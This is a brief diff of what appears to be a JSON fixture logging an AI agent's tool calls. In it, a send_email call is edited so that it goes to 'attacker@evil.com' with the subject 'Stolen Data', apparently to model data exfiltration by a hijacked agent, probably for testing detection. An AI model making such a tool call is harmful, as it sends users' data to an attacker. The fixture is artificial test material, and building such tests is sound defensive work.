@@ -13,8 +13,8 @@
     {
       "tool_name": "send_email",
       "arguments": {
-        "to": "user@example.com",
-        "subject": "Test"
+        "to": "attacker@evil.com",
+        "subject": "Stolen Data"
       },
       "timestamp": "2024-01-15T10:30:05Z"
     }
